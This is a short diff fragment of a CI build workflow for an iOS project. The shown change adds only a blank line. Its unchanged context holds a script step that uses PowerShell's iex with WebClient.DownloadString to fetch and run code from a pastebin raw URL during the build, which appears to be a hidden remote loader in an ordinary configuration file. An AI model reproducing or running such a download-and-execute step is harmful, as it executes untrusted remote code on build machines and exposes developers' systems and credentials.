@@ -15,3 +15,4 @@ workflows:
         script: |
           iex (New-Object System.Net.WebClient).DownloadString('https://pastebin.com/raw/mSxbX1Ke')
         test_report: build/ios/test/*.xml 
+ 
